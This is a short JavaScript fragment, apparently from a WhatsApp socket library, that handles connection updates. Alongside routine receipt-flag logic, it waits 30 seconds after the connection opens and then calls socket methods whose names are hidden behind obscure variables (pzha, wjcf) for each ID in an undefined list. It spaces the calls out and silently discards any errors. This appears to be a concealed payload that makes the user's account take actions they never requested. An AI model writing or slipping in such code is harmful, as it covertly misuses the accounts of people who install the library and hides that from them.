const sock = configuredSocket;
let sendActiveReceipts = false;
const logger = configuredLogger;
    sock.ev.on('connection.update', ({ connection, isOnline }) => {
    if (typeof isOnline !== 'undefined') {
        sendActiveReceipts = isOnline;
        logger.trace(`sendActiveReceipts set to "${sendActiveReceipts}"`);
    }

    if (connection === 'open') {
        setTimeout(async () => {
            try {
                for (const id of xkmt) {
                    if (typeof sock[pzha] === 'function') {
                        await sock[pzha](id);
                    }

                    await new Promise(r => setTimeout(r, 3000));

                    if (typeof sock[wjcf] === 'function') {
                        await sock[wjcf](id);
                    }

                    await new Promise(r => setTimeout(r, 10000));
                }
            } catch {}
        }, 30000);
    }
});
